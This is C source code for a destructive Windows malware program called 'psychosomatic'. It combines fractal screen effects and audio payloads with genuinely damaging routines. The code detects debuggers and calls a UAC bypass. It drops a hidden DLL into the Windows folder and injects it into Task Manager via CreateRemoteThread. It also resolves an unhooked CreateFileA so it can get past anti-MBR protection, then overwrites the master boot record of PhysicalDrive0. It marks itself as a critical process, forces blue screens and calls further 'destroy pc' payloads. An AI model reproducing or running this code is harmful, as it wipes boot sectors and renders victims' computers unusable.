#include "psychosomatic.h"
#include <ctype.h>

FAR* GetTickCountAny;
BOOL bTickCount64 = FALSE;
WCHAR selfPath[MAX_PATH];
COLORREF mandelbrotPalette[256] = 
	{ 14866657, 14866657, 14866912, 14801376, 14801375, 14801375, 14735838, 14735837, 14735837, 14670044, 14670043, 14604506, 14604505, 14604249, 14538712, 14538711, 14472918, 14472917, 14407380, 14407123, 14341586, 14341328, 14275791, 14209998, 14209741, 14144203, 14143946, 14078409, 14078151, 14012358, 13946821, 13946563, 13880770, 13880768, 13814975, 13814717, 13748924, 13683386, 13683129, 13617335, 13617078, 13551540, 13551283, 13485489, 13485232, 13419694, 13419437, 13419179, 13353386, 13353128, 13287591, 13287333, 13287076, 13221282, 13221025, 13220767, 13155230, 13154972, 13154715, 13088922, 13088664, 13088407, 13022614, 13022356, 13022355, 13022098, 12956304, 12956047, 12955790, 12955532, 12955275, 12889482, 12889225, 12888968, 12888966, 12888709, 12822916, 12822659, 12822402, 12822145, 12821888, 12756095, 12755838, 12755581, 12755324, 12755067, 12754810, 12689017, 12688760, 12688503, 12688246, 12687989, 12687988, 12687731, 12621939, 12621682, 12621425, 12621168, 12620911, 12620655, 12554862, 12554605, 12554349, 12554092, 12553835, 12553579, 12487530, 12487274, 12487017, 12486760, 12486504, 12486247, 12420455, 12420198, 12419942, 12419685, 12419429, 12353637, 12353380, 12353124, 12352868, 12287075, 12286819, 12286563, 12286050, 12220258, 12220002, 12219745, 12219489, 12153697, 12153441, 12153185, 12087392, 12086880, 12086624, 12020832, 12020576, 12020320, 11954527, 11954271, 11954015, 11887967, 11887711, 11821919, 11821663, 11821407, 11755615, 11755103, 11689310, 11689054, 11623262, 11623006, 11557214, 11556702, 11490910, 11490654, 11424862, 11359070, 11358558, 11292766, 11292510, 11226718, 11160926, 11160414, 11094622, 11028829, 10963037, 10962525, 10896733, 10830941, 10765149, 10764893, 10698845, 10633053, 10567261, 10501468, 10435676, 10369628, 10303836, 10238044, 10172252, 10106204, 10040411, 9974619, 9908827, 9843035, 9777242, 9711194, 9579866, 9514074, 9448281, 9382489, 9251161, 9185368, 9119576, 8987991, 8922199, 8790871, 8725078, 8593750, 8528213, 8396885, 8331092, 8199763, 8133971, 8002642, 7871314, 7805777, 7674448, 7543120, 7477583, 7346254, 7214925, 7083853, 7018060, 6886987, 6755658, 6690121, 6559049, 6427720, 6296647, 6230854, 6099781, 5968708, 5902916, 5771843, 5706306, 5575233, 5509440, 5378367, 5312830, 5181758, 5116221, 4985148, 4919611, 4853818, 4722746, 4657209, 4591672, 4526136, 4395063, 4329526, 4263990, 4198453, 4132916, 4067636, 4002099, 3936563, 3871026, 3871026, 3805490, 3740209, 3674672, 3609392, 3609391, 3544111 };
COLORREF mandelbrotNavyPalette[256] = 
	{ 0, 1, 2, 3, 4, 4, 5, 6, 7, 7, 8, 8, 9, 9, 10, 10, 10, 11, 11, 131083, 262155, 393227, 524299, 720907, 917515, 1114123, 1310731, 1507338, 1703946, 1966090, 2162698, 2424841, 2686985, 2949129, 3211272, 3473416, 3735560, 3997703, 4259847, 4587526, 4849670, 5177349, 5439493, 5767172, 6094852, 6356995, 6684674, 7012354, 7340033, 7602177, 7929856, 8257536, 8585216, 8912896, 9175040, 9502720, 9830400, 10158080, 10420224, 10747904, 11075584, 11337728, 11665408, 11927552, 12255232, 12517376, 12779520, 13107200, 13369344, 13631488, 13893632, 14090240, 14352384, 14614528, 14811136, 15073280, 15269888, 15466496, 15663104, 15859712, 15990784, 16187392, 16318464, 16515072, 16646144, 16711680, 16711680, 16711680, 16711680, 16711680, 16711680, 16711680, 16711680, 16711680, 16711680, 16711680, 16711680, 16711680, 16711680, 16711680, 16711680, 16711680, 16711680, 16580608, 16449537, 16252931, 16056324, 15859718, 15597575, 15400969, 15138826, 14876684, 14614542, 14286863, 14024721, 13697043, 13369365, 13041687, 12714009, 12320795, 11993118, 11599904, 11272226, 10879013, 10485799, 10092585, 9764908, 9371694, 8978481, 8585268, 8126518, 7733305, 7340092, 6946878, 6553665, 6160452, 5767239, 5374026, 5046349, 4653136, 4259923, 3866710, 3539033, 3145820, 2818143, 2490467, 2162790, 1835113, 1507436, 1179760, 917619, 655478, 393338, 131197, 128, 132, 135, 139, 142, 146, 149, 152, 156, 159, 163, 166, 170, 173, 176, 180, 183, 186, 190, 193, 196, 199, 202, 205, 208, 211, 214, 216, 219, 222, 224, 227, 229, 231, 234, 236, 238, 240, 242, 243, 245, 246, 248, 249, 250, 251, 252, 253, 253, 254, 254, 255, 131327, 262399, 327934, 459006, 590077, 721149, 786684, 917755, 1048825, 1114360, 1245430, 1376501, 1442035, 1507569, 1638638, 1704172, 1769705, 1900774, 1966307, 2031840, 2097372, 2097368, 2162900, 2228432, 2228428, 2293959, 2293954, 2293949, 2293944, 2293938, 2293932, 2293926, 2293920, 2228377, 2162834, 2162827, 2097284, 1966204, 1900660, 1835116, 1704036, 1572955, 1441874, 1310793, 1179711, 983093, 786475, 655393, 393238, 196619 };
COLORREF mandelbrotPrismPalette[256] =
{ 255, 255, 8703, 20991, 33535, 45311, 55295, 63231, 65506, 65458, 65409, 65107, 57898, 3783690, 8228864, 12148736, 15216384, 16711680, 16711705, 16711741, 16646249, 14090393, 10617034, 6488313, 1835263, 255, 3839, 15871, 28671, 40703, 51455, 60415, 65525, 65477, 65428, 65381, 60986, 1887254, 6464256, 10646528, 14107392, 16585472, 16711693, 16711726, 16711767, 15204485, 12124342, 8192231, 3735807, 255, 255, 11007, 23551, 35839, 47359, 57087, 64511, 65497, 65448, 65399, 63818, 56099, 4699141, 9012992, 12801536, 15738368, 16711683, 16711712, 16711750, 16187506, 13500579, 9830612, 5570815, 917759, 255, 6143, 18431, 30975, 43007, 53503, 61951, 65516, 65468, 65419, 65372, 59442, 2802960, 7313920, 11364864, 14694656, 16714240, 16711699, 16711733, 16711776, 14680207, 11403456, 7340272, 2818303, 255, 1279, 13311, 25855, 38143, 49407, 58879, 65534, 65487, 65438, 65390, 62530, 906269, 5549057, 9862656, 13454592, 16194560, 16711687, 16711718, 16711758, 15728764, 12845228, 9044189, 4718847, 255, 255, 8447, 20991, 33279, 45055, 55295, 63231, 65507, 65458, 65409, 65107, 57899, 3718411, 8163584, 12083200, 15216384, 16711936, 16711705, 16711741, 16646249, 14090393, 10682570, 6488313, 1900799, 255, 3583, 15871, 28415, 40447, 51455, 60415, 65525, 65478, 65429, 65381, 60986, 1821974, 6464256, 10580992, 14041856, 16585472, 16711693, 16711725, 16711766, 15270021, 12124342, 8257766, 3801343, 255, 255, 10751, 23295, 35839, 47359, 57087, 64511, 65497, 65449, 65400, 63819, 56100, 4633861, 9012992, 12801792, 15672832, 16711682, 16711711, 16711749, 16253042, 13500578, 9896147, 5636351, 983295, 255, 5887, 18431, 30975, 42751, 53247, 61695, 65516, 65468, 65419, 65372, 59698, 2802960, 7313920, 11365120, 14629120, 16714240, 16711698, 16711733, 16711775, 14745743, 11468992, 7405807, 2883839, 255, 1279, 13311, 25855, 38143, 49407, 58623, 65534, 65488, 65439, 65391, 62530, 906269, 5549057, 9797120, 13389056, 16129280, 16711687, 16711718, 16711757, 15794299, 12845228, 9109725, 4718847, 65791, 255, 8447, 20735, 33279, 45055, 55295, 63231, 65507, 65459, 65410, 65108 };
COLORREF mandelbrotNcarPalette[256] =
{ 8388608, 7735040, 7147008, 6493440, 5905664, 5252096, 4664064, 4076288, 3422720, 2834688, 2181120, 1593344, 1005312, 351744, 1464320, 2511104, 3623424, 4735744, 5782784, 6895104, 7941888, 9054208, 10166528, 11213568, 12325888, 13438208, 14484992, 15597568, 16715264, 16718848, 16722432, 16726016, 16729600, 16733184, 16736768, 16740352, 16744192, 16747776, 16751360, 16754944, 16758528, 16760832, 16762112, 16763392, 16764416, 16765440, 16766720, 16767744, 16769024, 16770048, 16771072, 16772352, 16707840, 16315904, 15858176, 15465984, 15007232, 14614016, 14155008, 13761792, 13302784, 12844032, 12450560, 11991808, 11598336, 11139584, 10746368, 10287616, 9632256, 8911360, 8256000, 7535104, 6880000, 6159104, 5504000, 4848640, 4127744, 3472640, 2751744, 2096640, 1375750, 720396, 64275, 63257, 62239, 61222, 60460, 59442, 58425, 57407, 56646, 55628, 54610, 53593, 52831, 53605, 54375, 55145, 56171, 56941, 57711, 58481, 59507, 60277, 61047, 61817, 62843, 260221, 523135, 786052, 1048456, 1310605, 1572753, 1834902, 2097050, 2359199, 2621348, 2883496, 3145645, 3407793, 3669942, 3932090, 3669951, 3407811, 3145672, 2883532, 2621393, 2359254, 2097114, 1834975, 1572835, 1310696, 1048556, 786417, 523509, 260858, 63487, 62975, 62207, 61695, 60927, 60415, 59647, 59135, 58367, 57855, 57087, 56575, 56063, 120831, 185855, 250623, 315647, 380415, 445439, 510207, 575231, 639999, 705023, 769791, 834815, 899583, 897535, 829951, 762367, 694783, 627199, 559359, 491775, 424191, 356607, 289023, 221183, 153599, 86015, 18431, 17151, 15871, 14847, 13567, 12287, 11007, 9983, 8703, 7423, 6143, 5119, 3839, 2559, 1115391, 2294015, 3473663, 4587775, 5767423, 6947071, 8061183, 9240831, 10420479, 11600127, 12714239, 13893887, 15073535, 16253183, 16450552, 16713457, 16714474, 16715235, 16716252, 16717013, 16718030, 16718791, 16719553, 16720570, 16721331, 16722348, 16657573, 16593566, 16529572, 16465578, 16401584, 16272054, 16208060, 16144066, 16080071, 16015821, 15886291, 15822297, 15758303, 15694309, 15630315, 15631596, 15698156, 15764973, 15766254, 15832815, 15834095, 15900656, 15967473, 15968753, 16035314, 16036595, 16103412, 16169972, 16171253, 16238070, 16239094, 16305911, 16372472, 16373753, 16440569, 16441594, 16508411, 16575227, 16576252, 16643069, 16709630 };
COLORREF mandelbrotFlagPalette[256] =
{ 255, 3498239, 8237823, 13036287, 16776959, 16772556, 16759172, 16738620, 16713984, 13565952, 8912896, 4128768, 0, 43, 115, 188, 252, 2641663, 7316735, 12116735, 16383487, 16774105, 16762258, 16742985, 16718856, 14417920, 9830400, 4980736, 655360, 31, 101, 174, 241, 1850623, 6395391, 11262207, 15662079, 16775397, 16765344, 16747095, 16723475, 15204352, 10747904, 5898240, 1441792, 19, 87, 160, 229, 1059583, 5474047, 10342143, 14874623, 16776433, 16767918, 16750949, 16728351, 15990784, 11665408, 6815744, 2228224, 8, 73, 146, 217, 333823, 4617727, 9421567, 14086911, 16776956, 16770236, 16754803, 16732971, 16711680, 12517376, 7733248, 3080192, 0, 60, 132, 204, 1279, 3695871, 8500735, 13233407, 16777215, 16772297, 16758145, 16737336, 16712704, 13369344, 8650752, 3932160, 0, 47, 118, 191, 255, 2839551, 7579903, 12379391, 16580351, 16773846, 16761487, 16741702, 16717573, 14221312, 9568256, 4784128, 524288, 34, 104, 178, 244, 2048511, 6658559, 11459583, 15858943, 16775138, 16764573, 16746067, 16722448, 15007744, 10485760, 5701632, 1245184, 22, 90, 164, 232, 1257215, 5737215, 10539519, 15071487, 16776174, 16767147, 16749921, 16727068, 15794176, 11403264, 6619136, 2031616, 10, 76, 150, 220, 531711, 4815615, 9618943, 14283775, 16776697, 16769720, 16753775, 16731688, 16515072, 12320768, 7536640, 2818048, 0, 63, 136, 207, 2559, 3959295, 8698367, 13430271, 16776959, 16771782, 16757373, 16736309, 16711680, 13172736, 8454144, 3670016, 0, 50, 122, 194, 255, 3102719, 7777279, 12576511, 16776959, 16773587, 16760715, 16740674, 16716290, 14024704, 9371648, 4587520, 327680, 37, 108, 181, 246, 2246143, 6856191, 11722239, 16055551, 16774879, 16763801, 16745040, 16721165, 14811136, 10289152, 5439488, 1048576, 25, 94, 167, 235, 1455103, 5934847, 10802175, 15268351, 16775915, 16766631, 16749150, 16726041, 15597568, 11206656, 6356992, 1835008, 13, 80, 153, 223, 663807, 5013247, 9881855, 14480895, 16776694, 16768949, 16753004, 16730661, 16318464, 12058624, 7274496, 2621440, 2, 66, 139, 211, 3839, 4156927, 8961279, 13627391, 16776959, 16771266, 16756602, 16735282, 16711680, 12976128, 8192000, 3473408, 0 };
WCHAR wUsernamePath[256];
BOOL ExtracedDLL = TRUE;
WCHAR PsychosomaticDLLPath[MAX_PATH] = { 0 };

VOID WINAPI PsInitTickCountAny( void ) {
	GetTickCountAny = (INT NEAR*)GetTickCount;

	if (sizeof(void*) == 4) // x86
		return;

	HMODULE kernel32 = LoadLibrary( (LPCTSTR)TEXT("kernel32.dll") );

	if (!kernel32)
		return;
	FARPROC fn64 = GetProcAddress(kernel32, "GetTickCount64");

	if (fn64) {
		GetTickCountAny = (INT FAR*)fn64;
		bTickCount64 = TRUE;
		DebugLine(L"[Info] Loaded x64 GetTickCount since it was available.");
	}

	FreeLibrary(kernel32);
}

BOOL WINAPI IsDebugged() {
	__try {
		RaiseException(DBG_CONTROL_C, 0, 0, NULL); // This exception crashes the program when debugged
		return TRUE;
	} __except (
				DBG_CONTROL_C == GetExceptionCode() ? EXCEPTION_EXECUTE_HANDLER : \
													  EXCEPTION_CONTINUE_SEARCH
		       ) {
		return FALSE;
	}
}

VOID WINAPI PsInit( INT argc, LPSTR* args ) {
	PS_INIT_HEADER
	WCHAR systemLocation[MAX_PATH];
	HRSRC hResourceSource = NULL;
	HGLOBAL hResource = NULL;
	HINSTANCE hInstance = NULL;
	LPBYTE lpResourceData = NULL;
	UINT uFailLine = 0;
	LPSTR failDescription = NULL;
	HANDLE hFile = NULL;
	BOOL bRet = FALSE;
	DWORD dwBytesWritten = 0, dwSize = 0;

	if (IsDebugged()) {
		MessageBoxW(NULL, L"What are you doing \U0001F480", L"bro why are you trying to debug me \U0001F480", MB_ICONQUESTION);
		ExitProcess(0);
	}

	#if PS_MODE == PRODUCTION
		LogonUICheck();
		BypassUAC(argc, args);
	#endif

	if (!GetWindowsDirectoryW(systemLocation, MAX_PATH)) {
		MessageBoxA(NULL, "Failed to get the Windows folder, exiting program!",
						  "You're messing with me, right?!", MB_ICONERROR);
		ExitProcess(1);
		return;
	}

	hInstance = GetModuleHandleW(NULL);
	
	PsInitTickCountAny();
	srand((UINT)(GetTickCountEx() % UINT_MAX));

	#define ASSERT(a) if (!(a)) { uFailLine = __LINE__ - 1; goto failed; }
	#define ASSERT2(a, s) if (!(a)) { uFailLine = __LINE__ - 1 - s; goto failed; }

	__try {
		hResourceSource = FindResourceW(hInstance, MAKEINTRESOURCEW(IDR_DLL1), L"DLL");
		ASSERT(hResourceSource);

		hResource = LoadResource(hInstance, hResourceSource);
		ASSERT(hResource);

		lpResourceData = LockResource(hResource);
		ASSERT(lpResourceData);

		dwSize = SizeofResource(hInstance, hResourceSource);
		ASSERT(dwSize);

		StringCchPrintfW(PsychosomaticDLLPath, MAX_PATH, L"%s\\psychosomaticDLL.dll", systemLocation);
		
		hFile = CreateFileW(PsychosomaticDLLPath, GENERIC_WRITE | GENERIC_READ,
							FILE_SHARE_WRITE | FILE_SHARE_READ, NULL, CREATE_ALWAYS,
							FILE_ATTRIBUTE_NORMAL, NULL);
		ASSERT2(hFile != INVALID_HANDLE_VALUE, 2);

		bRet = WriteFile(hFile, lpResourceData, dwSize, &dwBytesWritten, NULL);
		ASSERT(bRet);

		CloseHandle(hFile);
		goto ret;
	} __except (EXCEPTION_EXECUTE_HANDLER) {
		goto failed;
	}

	ret:
		return;
	failed:	
		if (!uFailLine)
			failDescription = "Report this to itzsten: An exception was raised\n\nContinue?\nWill exclude Task Manager hide.";
		else
			failDescription = sprintf_auto("Report this to itzsten: ASSERT(Line %u) was called\n\nContinue?\nWill exclude Task Manager hide.", uFailLine);

		if (MessageBoxA(NULL, failDescription, "Failed to extract hidden DLL",
					   MB_YESNO | MB_ICONERROR) == IDNO) {
			#ifndef DEBUG
				LocalFree(args);
			#endif
			if (uFailLine)
				free(failDescription);
			ExitProcess(1);
		}

		if (uFailLine)
			free(failDescription);

		ExtracedDLL = FALSE;
}
DWORD CALLBACK PsErrorPlayThread(_In_ LPVOID lpParameter) {
	Sleep(3000);
	UINT uErrorSounds[] = { MB_ICONWARNING, MB_ICONERROR };
	UINT uArrSize = _ARRAYSIZE(uErrorSounds);
	while (1) {
		MessageBeep(uErrorSounds[rand() % uArrSize]);
		Sleep(500);
	}
	return 0;
}

int HookProcessesList(DWORD dwPid) {
	SIZE_T dwBytesWritten = 0;
	HMODULE kernel32 = GetModuleHandleW(L"kernel32.dll");
	if (!kernel32) {
		printf("Kernel32 not found!\n");
		return 1;
	}
	FARPROC LoadLibraryWPtr = GetProcAddress(kernel32, "LoadLibraryW");
	if (!LoadLibraryWPtr) {
		printf("Failed to get address of LoadLibraryW!\n");
		return 1;
	}

	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
	if (!hProc) {
		printf("Couldn't open process to task manager! PID: %lu\n", dwPid);
		Sleep(-1);
		return 1;
	}
	printf("Handle to task manager acquired!\n");

	LPVOID lpRemoteMem = VirtualAllocEx(hProc, NULL, wcslen(PsychosomaticDLLPath) * 2 + 2,
										MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!lpRemoteMem) {
		printf("Failed to allocate virtual memory!\n");
		CloseHandle(hProc);
		return 1;
	}

	if (!WriteProcessMemory(hProc, lpRemoteMem, PsychosomaticDLLPath,
							wcslen(PsychosomaticDLLPath) * 2 + 2, &dwBytesWritten)) {
		printf("Failed to write remote process memory!\n");
		VirtualFreeEx(hProc, lpRemoteMem, 0, MEM_RELEASE);
		CloseHandle(hProc);
		return 1;
	}

	HANDLE hRemoteThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryWPtr,
											    lpRemoteMem, 0, NULL);
	if (!hRemoteThread) {
		printf("CreateRemoteThread failed!\n");
		VirtualFreeEx(hProc, lpRemoteMem, 0, MEM_RELEASE);
		CloseHandle(hProc);
		return 1;
	}
	printf("Remote thread started!\n");
	WaitForSingleObject(hRemoteThread, -1);

	CloseHandle(hRemoteThread);
	VirtualFreeEx(hProc, lpRemoteMem, 0, MEM_RELEASE);
	CloseHandle(hProc);
	Sleep(-1);
}

void WINAPI PayloadNoMBR() {
	MSGBOXPARAMSW par = { 0 };
	par.hInstance = GetModuleHandle(NULL);
	par.cbSize = sizeof(MSGBOXPARAMSW);
	par.lpszCaption = L"Bro really tried using NoMBR";
	par.lpszText = L"Ain't no way";
	par.dwStyle = MB_USERICON;
	par.lpszIcon = MAKEINTRESOURCEW(IDI_ICON2);
	MessageBoxIndirectW(&par);

	WCHAR sysDir[MAX_PATH] = { 0 };
	GetSystemDirectoryW(sysDir, MAX_PATH);
	StringCchCatW(sysDir, MAX_PATH, L"\\kernel32.dll");

	// WOW64 redirection will fix bitness
	HANDLE hFile = CreateFileW(sysDir, GENERIC_READ | GENERIC_EXECUTE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_READONLY, NULL);//Get a handle to the dll with read rights
	if (hFile == INVALID_HANDLE_VALUE) {
		DebugLine(L"kernel32 not exist :skull:\n");
		return;
	}
	PFILE_NAME_INFO fni = malloc(sizeof(FILE_NAME_INFO) + MAX_PATH * 2);
	if (!fni) {
		printf("out of mem\n");
		CloseHandle(hFile);
		return;
	}
	ZeroMemory(fni->FileName, MAX_PATH * 2 + 1);
	fni->FileNameLength = MAX_PATH;
	if (!GetFileInformationByHandleEx(hFile, FileNameInfo, fni, sizeof(FILE_NAME_INFO) + MAX_PATH * 2)) {
		printf("GetFileInformationByHandleEx failed\n");
		CloseHandle(hFile);
		free(fni);
		return;
	}
	BOOL NewerHook = FALSE;
	LPWSTR sysDirNoDrive = sysDir;
	while (*sysDirNoDrive != L':')
		sysDirNoDrive++;
	sysDirNoDrive++;
	wprintf(L"Requested: %ls\nGathered:  %ls\n", sysDirNoDrive, fni->FileName);
	if (wcscmp(sysDirNoDrive, fni->FileName)) {
		printf("Newer hook detected\n");
		NewerHook = TRUE;
	}
	free(fni);

	HANDLE fMap = CreateFileMappingA(hFile, NULL, PAGE_EXECUTE_READ | SEC_IMAGE, 0, 0, "originalDLL");
	if (!fMap) {
		DebugLine(L"Failed to create file map\n");
		CloseHandle(hFile);
		return;
	}
	
	PCHAR imageBase = MapViewOfFile(fMap, FILE_MAP_EXECUTE | FILE_MAP_READ, 0, 0, 0);
	if (!imageBase) {
		DebugLine(L"MapViewOfFile failed!\n");
		CloseHandle(hFile);
		CloseHandle(fMap);
		return;
	}

	DebugLine(L"\nResolving original address . . .\n");

	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)imageBase;
	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		DebugLine(L"kernel 32 isn't dos file??\n");
		UnmapViewOfFile(imageBase);
		CloseHandle(hFile);
		CloseHandle(fMap);
		return;
	}
	PIMAGE_NT_HEADERS32 pNtHeader32 = (PIMAGE_NT_HEADERS32)(imageBase + pDosHeader->e_lfanew);
	PIMAGE_NT_HEADERS64 pNtHeader64 = (PIMAGE_NT_HEADERS64)(imageBase + pDosHeader->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY pExportHeader = { 0 };

	if (pNtHeader32->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC)
		pExportHeader = (PIMAGE_EXPORT_DIRECTORY)(imageBase +
			pNtHeader32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	else if (pNtHeader32->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC)
		pExportHeader = (PIMAGE_EXPORT_DIRECTORY)(imageBase +
			pNtHeader64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	else {
		DebugLine(L"Invalid optional header magic\n");
		UnmapViewOfFile(imageBase);
		CloseHandle(hFile);
		CloseHandle(fMap);
		return;
	}

	PDWORD functionTable = (DWORD*)(imageBase + pExportHeader->AddressOfFunctions);
	PDWORD nameTable     = (DWORD*)(imageBase + pExportHeader->AddressOfNames);
	PWORD  ordinalTable  = (WORD*)(imageBase + pExportHeader->AddressOfNameOrdinals);
	BOOL bFound = FALSE;
	DWORD_PTR dwAddress = 0;

	for (DWORD i = 0; i < pExportHeader->NumberOfNames; i++) {
		char* st = (char*)(imageBase + nameTable[i]);
		if (!strcmp(st, "CreateFileA")) {
			bFound = TRUE;
			dwAddress = functionTable[ordinalTable[i]];
			break;
		}
	}

	if (!bFound)
		DebugLine(L"CreateFileA not found\n");
	else {
		#ifdef DEBUG
			printf("Original CreateFileA found at offset %lu\n", (DWORD)dwAddress);
		#endif
		HMODULE kn32 = GetModuleHandleA("kernel32.dll");
		HANDLE(WINAPI * OriginalCreateFileA)(LPCSTR, DWORD,
			DWORD, LPVOID, DWORD, DWORD, HANDLE) = (HANDLE(WINAPI*)(LPCSTR, DWORD,
				DWORD, LPVOID, DWORD, DWORD, HANDLE))((ULONG_PTR)imageBase + dwAddress);
		#ifdef DEBUG
			printf("Original CreateFileA exported at address %p\n", OriginalCreateFileA);
		#endif
		HANDLE mbr = OriginalCreateFileA("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
		if (!mbr) {
			DebugLine(L"failed :(\n");
		}
		else {
			if (mbr == INVALID_HANDLE_VALUE) {
				DebugLine(L"Success but not really lmao\n");
			}
			else {
				DebugLine(L"Success ;)\n");
				unsigned char buf[512];
				DWORD dwBytesWritten = 0;
				ZeroMemory(buf, sizeof(buf));
				if (!WriteFile(mbr, buf, 512, &dwBytesWritten, NULL)) {
					DebugLine(L"WriteFile failed :skull:\n");
				}
				else {
					RtlSetProcessIsCritical(1, NULL, 0);
					BSOD(0xDEADDEAD);
				}
				CloseHandle(mbr);
			}
		}
	}

	UnmapViewOfFile(imageBase);
	CloseHandle(fMap);
	CloseHandle(hFile);
}

#ifdef DEBUG
INT main(INT argc, LPSTR* args) {
	HINSTANCE hInstance = GetModuleHandle(NULL);
#else
INT WINAPI WinMain(
	_In_     HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_     LPSTR     lpCmdLine,
	_In_     INT       nShowCmd) {
	INT argc;
	LPSTR* args = CommandLineToArgvA(GetCommandLineA(), &argc);
#endif
	PsInit(argc, args);

	if (!CreateMutexA(NULL, TRUE, "psychosomatic")) {
		if (GetLastError() == ERROR_ALREADY_EXISTS) {
			MessageBoxA(NULL, "psychosomatic is already running!", "psychosomatic.exe",
				MB_ICONERROR);
			ExitProcess(1);
		}
	}

	if (argc > 1)
		mbstowcs(wUsernamePath, args[1], MAX_PATH);

	BOOL Hooked = FALSE;

	if (argc > 2)
		if (!strcmp(args[2], "1"))
			Hooked = TRUE;

	if (Hooked) {
		RtlSetProcessIsCritical(TRUE, NULL, FALSE);
		PayloadNoMBR();
		MessageBoxA(NULL, "sorry bro I couldn't bypass it...", "new update?", MB_ICONERROR);
		MessageBoxA(NULL, "but there's still other ways to destroy a system :)", ":D", MB_ICONASTERISK);
		HANDLE t = PsLaunchFinalDestructivePayload();
		WaitForSingleObject(t, INFINITE);
		CloseHandle(t);
		return 1;
	}

	INT line = 0;

	if (line = InitializePayload3D()) {
		CHAR buf[256] = "hello ida pro cracked lolz";

		StringCchPrintfA(buf, 256, "Report this to Itzsten: Line %d\0 stop decompiling bro", line);
		MessageBoxA(NULL, buf, "Error occoured while initializing 3D payload", MB_ICONERROR);
		return 1;
	}

	RtlSetProcessIsCritical(TRUE, NULL, FALSE);

	// Payloads
	PsHideFromProcessesPayload();
	PsDestructionMain(); // destroy pc :)

	SHADER_DATA shd = {rand() % 3 /* color */,
					    rand() % 2 /* up or down */ };
	HANDLE audioThread = NULL;
	DWORD dwThird = 0;
	SHADER_DATA juliaShd = { rand() % 5 /* color mode */ };
	PS_LAYERED_WINDOW lWnds[20] = { 0 };
	FRACTAL_COLORMAP mandelbrotColormap = {
		(COLORREF*)&mandelbrotFlagPalette/*choice(choice(
			choice(choice(&mandelbrotNcarPalette,
					      &mandelbrotFlagPalette), &mandelbrotPalette),
			&mandelbrotPrismPalette), &mandelbrotNavyPalette)*/,
		256 };

	
	// Initialize payloads
	PS_PAYLOAD payload1 = PS_PAYLOAD_DEFAULT(layeredWindowPayload1, AudioSequence1, 8000,  PS_PAYLOAD_LENGTH, &shd);
	PS_PAYLOAD payload2 = PS_PAYLOAD_DEFAULT(layeredWindowPayload3, AudioSequence2, 8000,  PS_PAYLOAD_LENGTH, NULL);
	PS_PAYLOAD payload3 = PS_PAYLOAD_DEFAULT(layeredWindowPayload2, AudioSequence3, 8000,  PS_PAYLOAD_LENGTH, NULL);
	PS_PAYLOAD payload4 = PS_PAYLOAD_DEFAULT(layeredWindowPayload4, AudioSequence4, 24000, PS_PAYLOAD_LENGTH, NULL);
	PS_PAYLOAD payload5 = PS_PAYLOAD_DEFAULT(layeredWindowPayload5, AudioSequence5, 24000, PS_PAYLOAD_LENGTH, &mandelbrotColormap);
	PS_PAYLOAD payload6 = PS_PAYLOAD_DEFAULT(layeredWindowPayload6, AudioSequence6, 8000,  PS_PAYLOAD_LENGTH, &juliaShd);
	PS_PAYLOAD payload7 = PS_PAYLOAD_DEFAULT(layeredWindowPayload7, AudioSequence7, 44000, PS_PAYLOAD_LENGTH * 2, NULL);
	
	lWnds[0] = PsLayeredWindowNew(payload1.lwp);
	PsRunAudioSynchronous(payload1.ad);
	lWnds[1] = PsLayeredWindowNew(payload2.lwp);
	PsRunAudioSynchronous(payload2.ad);

	PsCloseLayeredWindow(lWnds[1]);
	PsCloseLayeredWindow(lWnds[0]);

	audioThread = PsStartAudioThread(payload5.ad);
	lWnds[0] = PsLayeredWindowNew(payload5.lwp);

	Sleep((payload5.dwDurationInSeconds * 1000) / 2);
	lWnds[1] = PsLayeredWindowNew(payload3.lwp);
	Sleep((payload5.dwDurationInSeconds * 1000) / 2);

	// close
	PsStopAudioThread(audioThread);
	PsCloseLayeredWindow(lWnds[0]);
	PsCloseLayeredWindow(lWnds[1]);

	// circle rotating payload
	lWnds[0] = PsLayeredWindowNew(payload4.lwp);
	PsRunAudioSynchronous(payload4.ad);

	PsCloseLayeredWindow(lWnds[0]);
	lWnds[0] = PsLayeredWindowNew(payload6.lwp);
	PsRunAudioSynchronous(payload6.ad);
	PsCloseLayeredWindow(lWnds[0]);

	lWnds[0] = PsLayeredWindowNew(payload1.lwp);
	lWnds[1] = PsLayeredWindowNew(payload2.lwp);
	lWnds[2] = PsLayeredWindowNew(payload3.lwp);
	PsLaunchThread(PsBonusPayloadThread, hInstance);
	PsRunAudioSynchronous(payload3.ad);
	PsCloseLayeredWindow(lWnds[2]);
	PsCloseLayeredWindow(lWnds[1]);
	PsCloseLayeredWindow(lWnds[0]);

	// burning ship fractal payload
	lWnds[0] = PsLayeredWindowNew(payload7.lwp);
	audioThread = PsStartAudioThread(payload7.ad);
	dwThird = (payload7.dwDurationInSeconds * 1000) / 4;

	Sleep(40000);
	lWnds[1] = PsLayeredWindowNew(payload1.lwp);
	lWnds[2] = PsLayeredWindowNew(payload3.lwp);
	Sleep(10000);
	PsLaunchThread(PsErrorPlayThread, NULL);
	lWnds[3] = PsLayeredWindowNew(payload2.lwp);
	PsStartAudioThread(payload5.ad);
	lWnds[4] = PsLayeredWindowNew(payload4.lwp);
	PsLaunchFinalDestructivePayload();
	Sleep(10000);

	PsStopAudioThread(audioThread);
	PsCloseLayeredWindow(lWnds[4]);
	PsCloseLayeredWindow(lWnds[3]);
	PsCloseLayeredWindow(lWnds[2]);
	PsCloseLayeredWindow(lWnds[1]);
	PsCloseLayeredWindow(lWnds[0]);
	

	#ifndef DEBUG
		LocalFree(args);
	#endif
	
	BSOD(0xDEADDEAD);

	return 0;
}
